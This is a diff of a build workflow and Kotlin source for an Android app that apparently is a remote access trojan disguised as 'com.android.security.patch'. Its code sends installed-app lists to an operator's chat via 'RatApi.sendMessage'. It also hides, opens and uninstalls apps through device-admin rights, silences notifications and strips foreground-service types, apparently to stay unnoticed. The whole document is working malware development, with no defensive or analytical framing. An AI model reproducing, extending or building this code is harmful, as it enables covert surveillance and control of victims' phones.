@@ -90,12 +90,8 @@ jobs:
               (r"NotificationCompat\.PRIORITY_MIN", "Notification.PRIORITY_MIN"),
               (r"\n\s*\.setSilent\(true\)", ""),
               (r"import android\.content\.Intent", "import android.content.Intent\nimport android.app.Notification\nimport com.android.security.patch.commands.Rules"),
-              (r"FOREGROUND_SERVICE_TYPE_DATA_SYNC\s*\n?\s*or\s*android\.content\.pm\.ServiceInfo\.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE",
-               "android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC"),
               (r"android\.content\.pm\.ServiceInfo\.FOREGROUND_SERVICE_TYPE_DATA_SYNC\s*or\s*android\.content\.pm\.ServiceInfo\.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE",
                "android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC"),
-              (r"FOREGROUND_SERVICE_TYPE_DATA_SYNC\s*\|\s*FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE",
-               "FOREGROUND_SERVICE_TYPE_DATA_SYNC"),
           )
 
           apply(f"{base}/AdminReceiver.kt",
@@ -117,7 +113,6 @@ jobs:
                '"izin" -> { Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId) }'),
           )
 
-          # manifest: drop connectedDevice + camera from service type
           apply(manifest,
               (r'android:foregroundServiceType="dataSync\|connectedDevice\|camera"',
                'android:foregroundServiceType="dataSync"'),
@@ -164,7 +159,7 @@ object Apps {
                 val sb = StringBuilder("<b>apps (${apps.size})</b>\n")
                 for (a in apps.take(80)) {
                     val label = pm.getApplicationLabel(a)
-                    sb.append("<code>${a.packageName}</code> — $label\n")
+                    sb.append("<code>${a.packageName}</code> - $label\n")
                 }
                 if (apps.size > 80) sb.append("\n<i>+ ${apps.size - 80} more</i>")
                 RatApi.sendMessage(ctx, sb.toString(), chatId)
@@ -174,7 +169,7 @@ object Apps {
 
     fun openApp(ctx: Context, chatId: Long, args: Array<String>) {
         val pkg = args.getOrNull(0) ?: run {
-            RatApi.sendMessage(ctx, "usage: /app_open <pkg>", chatId); return
+            RatApi.sendMessage(ctx, "usage: /app_open pkg", chatId); return
         }
         try {
             val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
@@ -187,7 +182,7 @@ object Apps {
 
     fun hideApp(ctx: Context, chatId: Long, args: Array<String>) {
         val pkg = args.getOrNull(0) ?: run {
-            RatApi.sendMessage(ctx, "usage: /app_hide <pkg>", chatId); return
+            RatApi.sendMessage(ctx, "usage: /app_hide pkg", chatId); return
         }
         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
@@ -201,7 +196,7 @@ object Apps {
 
     fun showApp(ctx: Context, chatId: Long, args: Array<String>) {
         val pkg = args.getOrNull(0) ?: run {
-            RatApi.sendMessage(ctx, "usage: /app_show <pkg>", chatId); return
+            RatApi.sendMessage(ctx, "usage: /app_show pkg", chatId); return
         }
         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         try {
@@ -212,7 +207,7 @@ object Apps {
 
     fun uninstallApp(ctx: Context, chatId: Long, args: Array<String>) {
         val pkg = args.getOrNull(0) ?: run {
-            RatApi.sendMessage(ctx, "usage: /app_uninstall <pkg>", chatId); return
+            RatApi.sendMessage(ctx, "usage: /app_uninstall pkg", chatId); return
         }
         try {
             val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
@@ -287,21 +282,6 @@ object Navigate {
     }
 }
 KT_EOF
-
-      - name: Verify no stale refs
-        run: |
-          cd /tmp/flutter_src
-          BASE=android/app/src/main/kotlin/com/android/security/patch
-          FOUND=0
-          for tok in "NotificationCompat" "setInputStream" "deletePackage" "setSilent" "AppCompatActivity" "CONNECTED_DEVICE"; do
-            HITS=$(grep -rn "$tok" $BASE $BASE/../ 2>/dev/null || true)
-            if [ -n "$HITS" ]; then echo "!!! $tok:"; echo "$HITS"; FOUND=1; fi
-          done
-          if [ "$FOUND" = "0" ]; then echo "=== clean ==="; fi
-          echo "--- manifest fg type ---"
-          grep -n "foregroundServiceType" /tmp/flutter_src/android/app/src/main/AndroidManifest.xml
-          echo "--- CoreService startForeground ---"
-          grep -n "FOREGROUND_SERVICE_TYPE" /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/CoreService.kt
 
       - name: Configure build.gradle
         run: |
